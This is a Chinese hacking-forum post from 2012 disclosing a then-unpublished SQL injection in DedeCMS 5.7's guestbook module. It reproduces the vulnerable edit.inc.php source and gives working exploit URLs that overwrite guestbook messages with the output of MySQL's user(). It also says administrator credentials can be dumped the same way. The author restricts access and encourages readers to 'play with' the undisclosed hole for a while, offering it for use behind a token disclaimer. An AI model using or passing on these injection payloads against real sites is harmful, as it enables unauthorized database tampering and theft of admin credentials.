@@ -1,0 +1,96 @@
+[【原创】] (首发)dedecms 5.7 最新漏洞(绝非网上公布的)
+本帖最后由 鬼哥 于 2012-11-4 01:57 编辑 
+
+先说下为什么设置阅读权限，
+1.为了有效的防止 传播 转载 公布
+2.一些首发漏洞就得设置点权限 自然以后大家都想着升官 这样才能看到更好的贴 自然想升官就得自己先发好贴 这样一来 自然好贴就多了。
+不知道有没有道理，反正我是这样觉得的。当然过段时间 会设置成0权限查看。一开始嘛 先让一些发过好贴升官的人看嘛，就象wooyun 先核心看 再普通 在初级的 这样我觉得是更好些 ！
+
+
+漏洞：dedecms 5.7 最新sql漏洞一枚
+作者：鬼哥
+版权：www.90sec.org
+
+看此贴你需要保证以下几点：
+                                        1.保证需要人品好
+                                        2.保证不非法利用(只漏洞检测修复 不干坏事)[否则后果自负]
+                                        3.绝对保证100%不传播 公开 转载 (如发现：传播 转载 公布)我只能说我会很伤心！ 没公开的漏洞能玩就先玩段时间嘛！
+                                        4.尊重版权!
+
+
+
+漏洞文件edit.inc.php具体代码：<?php
+
+if(!defined('DEDEINC')) exit('Request Error!');
+
+if(!empty($_COOKIE['GUEST_BOOK_POS'])) $GUEST_BOOK_POS = $_COOKIE['GUEST_BOOK_POS'];
+else $GUEST_BOOK_POS = "guestbook.php";
+
+$id = intval($id);
+if(empty($job)) $job='view';
+
+if($job=='del' && $g_isadmin)
+{
+    $dsql->ExecuteNoneQuery(" DELETE FROM `#@__guestbook` WHERE id='$id' ");
+    ShowMsg("成功删除一条留言！", $GUEST_BOOK_POS);
+    exit();
+}
+else if($job=='check' && $g_isadmin)
+{
+    $dsql->ExecuteNoneQuery(" UPDATE `#@__guestbook` SET ischeck=1 WHERE id='$id' ");
+    ShowMsg("成功审核一条留言！", $GUEST_BOOK_POS);
+    exit();
+}
+else if($job=='editok')
+{
+    $remsg = trim($remsg);
+    if($remsg!='')
+    {
+        //管理员回复不过滤HTML
+        if($g_isadmin)
+        {
+            $msg = "<div class=\\'rebox\\'>".$msg."</div>\n".$remsg; 
+            //$remsg <br><font color=red>管理员回复：</font>
+        }
+        else
+        {
+            $row = $dsql->GetOne("SELECT msg From `#@__guestbook` WHERE id='$id' "); 
+            $oldmsg = "<div class=\\'rebox\\'>".addslashes($row['msg'])."</div>\n";
+            $remsg = trimMsg(cn_substrR($remsg, 1024), 1);
+            $msg = $oldmsg.$remsg;
+        }
+    }
+   //这里没有对$msg过滤，导致可以任意注入了
+    $dsql->ExecuteNoneQuery("UPDATE `#@__guestbook` SET `msg`='$msg', `posttime`='".time()."' WHERE id='$id' ");
+    ShowMsg("成功更改或回复一条留言！", $GUEST_BOOK_POS);
+    exit();
+}
+
+if($g_isadmin)
+{
+    $row = $dsql->GetOne("SELECT * FROM `#@__guestbook` WHERE id='$id'");
+    require_once(DEDETEMPLATE.'/plus/guestbook-admin.htm');
+}
+else
+{
+    $row = $dsql->GetOne("SELECT id,title FROM `#@__guestbook` WHERE id='$id'");
+    require_once(DEDETEMPLATE.'/plus/guestbook-user.htm');
+}
+
+漏洞成功需要条件：
+                          1. php magic_quotes_gpc=off 
+                          2.漏洞文件存在 plus/guestbook.php dede_guestbook 表当然也要存在。
+
+怎么判断是否存在漏洞：
+                                先打开www.xxx.com/plus/guestbook.php  可以看到别人的留言，
+                                然后鼠标放在 [回复/编辑]   上 可以看到别人留言的ID。那么记下ID
+                                访问：www.xxx.com/plus/guestbook.php?action=admin&job=editok&msg=90sec'&id=存在的留言ID
+                                提交后如果是dede5.7版本的话 会出现 “成功更改或回复一条留言” 那就证明修改成功了
+                               跳回到www.xxx.com/plus/guestbook.php 看下你改的那条留言ID是否变成了 90sec' 如果变成了 那么证明漏洞无法利用应为他开启了 php magic_quotes_gpc=off 
+                               如果没有修改成功，那留言ID的内容还是以前的 那就证明漏洞可以利用。
+                               那么再次访问 www.xxx.com/plus/guestbook.php?action=admin&job=editok&id=存在的留言ID&msg=',msg=user(),email='
+                               然后返回，那条留言ID的内容就直接修改成了mysql 的user().
+
+大概利用就是这样，大家有兴趣的多研究下！！
+
+最后补充下，估计有人会说怎么暴管理后台帐户密码，你自己研究下 会知道的。反正绝对可以暴出来(不可以暴出来我就不会发)！！ 
